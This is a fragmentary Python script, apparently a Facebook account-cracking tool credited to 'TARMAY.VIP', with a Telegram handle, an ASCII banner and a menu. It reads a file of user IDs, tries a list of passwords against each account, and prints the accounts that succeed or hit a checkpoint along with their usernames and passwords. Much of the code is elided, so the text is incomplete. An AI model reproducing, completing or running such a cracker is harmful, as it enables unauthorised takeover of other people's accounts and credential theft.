...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;96m𝑻𝑨𝑹𝑴𝑨𝒀.𝑽𝑰𝑷')
...
def banner():
 ...
 ________  ______   _______   __       __   ______   __      __ 
/        |/      \ /       \ /  \     /  | /      \ /  \    /  |
$$$$$$$$//$$$$$$  |$$$$$$$  |$$  \   /$$ |/$$$$$$  |$$  \  /$$/ 
   $$ |  $$ |__$$ |$$ |__$$ |$$$  \ /$$$ |$$ |__$$ | $$  \/$$/  
   $$ |  $$    $$ |$$    $$< $$$$  /$$$$ |$$    $$ |  $$  $$/   
...
AUTHOR: 𝑻𝑨𝑹𝑴𝑨𝒀.𝑽𝑰𝑷
UPDATED BY: 𝑻𝑨𝑹𝑴𝑨𝒀.𝑽𝑰𝑷
TELEGRAM: @tarmay.shaw1
---------------------------------------------  
...
def menu():
	...
	print(f'\x1b[1;93m1- 𝑪𝑹𝑨𝑪𝑲 𝑩𝑨 𝑭𝑰𝑳𝑬')
...
class D:
	...
	def plerr(self):
		...
		try:
			...
			fileX = input ('\x1b[1;93m𝑵𝑨𝑴𝑬 𝑭𝑰𝑳𝑬 : ')
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\x1b[1;93m𝑯𝑨𝑴𝑼 𝑰𝑫 : \x1b[1;93m'+str(len(id)))
			Settings()
		except IOError:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r ✓ 𝑻𝑨𝑹𝑴𝑨𝒀..𝑽𝑰𝑷 ✓ {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%})'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\n\x1b[1;93m 𝑭𝑨𝑬𝑪𝑩𝑶𝑶𝑲: \x1b[1;96m{tahun(idf)}{P} \n\x1b[1;93m 𝑼𝑺𝑬𝑹𝑵𝑨𝑴𝑬: \x1b[1;96m{idf}\n\x1b[1;93m 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫: \x1b[1;96m{pw}')
				...
				print(f'\n\x1b[1;92m 𝑭𝑨𝑬𝑪𝑩𝑶𝑶𝑲 ✓: \x1b[1;94m{tahun(idf)} \n\x1b[1;92m 𝑼𝑺𝑬𝑹𝑵𝑨𝑴𝑬 ✓: \x1b[1;94m{idf}\n\x1b[1;92m 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫 ✓: \x1b[1;94m{pw}')
